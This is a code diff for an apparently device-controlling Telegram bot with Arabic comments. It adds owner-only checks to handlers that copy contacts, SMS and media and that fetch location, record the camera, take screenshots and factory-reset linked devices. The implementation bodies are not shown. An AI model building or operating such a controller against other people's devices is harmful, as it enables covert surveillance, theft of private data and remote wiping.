@@ -383,11 +383,20 @@ def setup_authorized_users():
         is_admin=True
     )
 
+# دالة تحقق مركزية لصلاحية المالك فقط
+
+def is_owner(user_id):
+    return user_id == OWNER_USER_ID
+
 # معالجة الأوامر
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     """معالجة أمر البداية"""
     user_id = message.from_user.id
+    
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
     
     # التحقق من الصلاحية
     if not device_manager.is_user_authorized(user_id):
@@ -426,6 +435,10 @@ def send_help(message):
     """معالجة أمر المساعدة"""
     user_id = message.from_user.id
     
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
+    
     if not device_manager.is_user_authorized(user_id):
         bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
         return
@@ -462,6 +475,10 @@ def send_help(message):
 def link_device(message):
     """ربط جهاز جديد"""
     user_id = message.from_user.id
+    
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
     
     if not device_manager.is_user_authorized(user_id):
         bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
@@ -513,6 +530,10 @@ def list_devices(message):
     """عرض الأجهزة المرتبطة"""
     user_id = message.from_user.id
     
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
+    
     if not device_manager.is_user_authorized(user_id):
         bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
         return
@@ -560,6 +581,10 @@ def backup_contacts(message):
     """نسخ جهات الاتصال"""
     user_id = message.from_user.id
     
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
+    
     if not device_manager.is_user_authorized(user_id):
         bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
         return
@@ -599,6 +624,10 @@ def backup_sms(message):
     """نسخ الرسائل النصية"""
     user_id = message.from_user.id
     
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
+    
     if not device_manager.is_user_authorized(user_id):
         bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
         return
@@ -632,6 +661,10 @@ def backup_sms(message):
 def backup_media(message):
     """نسخ الوسائط"""
     user_id = message.from_user.id
+    
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
     
     if not device_manager.is_user_authorized(user_id):
         bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
@@ -667,6 +700,10 @@ def get_location(message):
     """الحصول على الموقع"""
     user_id = message.from_user.id
     
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
+    
     if not device_manager.is_user_authorized(user_id):
         bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
         return
@@ -700,6 +737,10 @@ def get_location(message):
 def record_camera(message):
     """تسجيل الكاميرا"""
     user_id = message.from_user.id
+    
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
     
     if not device_manager.is_user_authorized(user_id):
         bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
@@ -736,6 +777,10 @@ def take_screenshot(message):
     """لقطة شاشة"""
     user_id = message.from_user.id
     
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
+    
     if not device_manager.is_user_authorized(user_id):
         bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
         return
@@ -769,6 +814,10 @@ def take_screenshot(message):
 def factory_reset(message):
     """إعادة ضبط المصنع"""
     user_id = message.from_user.id
+    
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
     
     if not device_manager.is_user_authorized(user_id):
         bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
@@ -822,6 +871,10 @@ def confirm_reset(message):
     """تأكيد إعادة الضبط"""
     user_id = message.from_user.id
     
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
+    
     if user_id not in command_queue:
         bot.reply_to(message, "❌ لا توجد أوامر في قائمة الانتظار.")
         return
@@ -858,6 +911,10 @@ def cancel_reset(message):
     """إلغاء إعادة الضبط"""
     user_id = message.from_user.id
     
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
+    
     if user_id in command_queue:
         del command_queue[user_id]
         bot.reply_to(message, "✅ تم إلغاء إعادة الضبط.")
@@ -871,8 +928,8 @@ def handle_text_message(message):
     """معالجة الرسائل النصية"""
     user_id = message.from_user.id
     
-    if not device_manager.is_user_authorized(user_id):
-        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
         return
     
     # التحقق من وجود أمر في قائمة الانتظار
